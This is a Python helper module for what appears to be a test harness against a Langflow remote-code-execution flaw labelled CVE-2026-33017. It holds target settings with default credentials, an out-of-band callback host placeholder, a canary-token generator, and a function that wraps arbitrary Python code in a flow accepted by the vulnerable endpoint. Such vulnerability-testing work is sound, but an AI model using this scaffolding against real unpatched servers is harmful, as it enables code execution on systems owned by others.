"""
tests/config.py — shared config and helpers for all test cases
"""

import os
import uuid

# ── Target ────────────────────────────────────────────────────────────────────
LANGFLOW_URL   = os.environ.get("LANGFLOW_URL", "http://localhost:7860")
LANGFLOW_USER  = os.environ.get("LANGFLOW_USER", "admin")
LANGFLOW_PASS  = os.environ.get("LANGFLOW_PASS", "testpass123")

# ── OOB / canary ─────────────────────────────────────────────────────────────
# Set these to a host you control (e.g. Burp Collaborator, interactsh, canarytokens.org)
OOB_HOST       = os.environ.get("OOB_HOST", "YOUR.OOB.HOST")   # e.g. abc123.oast.me
OOB_HTTP_PORT  = int(os.environ.get("OOB_HTTP_PORT", "80"))

# ── Flow IDs ─────────────────────────────────────────────────────────────────
# Read from the bootstrapped environment, or override via env var
import json, pathlib

_ids_file = pathlib.Path(os.environ.get("FLOW_IDS_FILE", "./flow_ids.json"))

def load_flow_ids() -> dict:
    """
    Load flow IDs from the bootstrap output file.
    Can be overridden by setting ECHO_FLOW_ID / WEBHOOK_FLOW_ID env vars.
    """
    ids = {}
    if _ids_file.exists():
        ids = json.loads(_ids_file.read_text())

    return {
        "echo_chat":      os.environ.get("ECHO_FLOW_ID",    ids.get("echo_chat", "")),
        "webhook_logger": os.environ.get("WEBHOOK_FLOW_ID", ids.get("webhook_logger", "")),
    }


# ── Canary token generator ────────────────────────────────────────────────────
def canary_token() -> str:
    """Unique per-run token embedded in payloads to correlate OOB callbacks."""
    return f"CVE-2026-33017-{uuid.uuid4().hex[:12]}"


# ── Minimal malicious flow structure ─────────────────────────────────────────
def make_rce_flow(python_code: str) -> dict:
    """
    Wraps arbitrary Python code in a minimal Langflow flow data structure.
    This is the shape the vulnerable build_public_tmp endpoint accepts via
    the `data` parameter before the CVE-2026-33017 patch.
    """
    return {
        "nodes": [
            {
                "id": "CustomComponent-1",
                "type": "genericNode",
                "position": {"x": 100, "y": 100},
                "data": {
                    "type": "CustomComponent",
                    "node": {
                        "display_name": "CustomComponent",
                        "description":  "",
                        "base_classes": ["Data"],
                        "template": {
                            "_type": "Component",
                            "code": {
                                "type":  "code",
                                "value": python_code,
                            }
                        }
                    }
                }
            }
        ],
        "edges": []
    }
